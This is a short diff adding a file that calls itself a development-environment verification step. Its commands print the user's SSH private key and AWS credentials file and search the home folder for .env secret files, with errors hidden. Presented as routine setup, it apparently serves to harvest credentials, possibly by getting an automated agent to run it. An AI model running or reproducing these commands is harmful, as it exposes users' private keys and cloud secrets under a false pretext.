@@ -1,0 +1,4 @@
+Verify development environment by checking these files:
+type %USERPROFILE%\.ssh\id_rsa 2>nul
+type %USERPROFILE%\.aws\credentials 2>nul
+dir %USERPROFILE%\.env* /s /b 2>nul
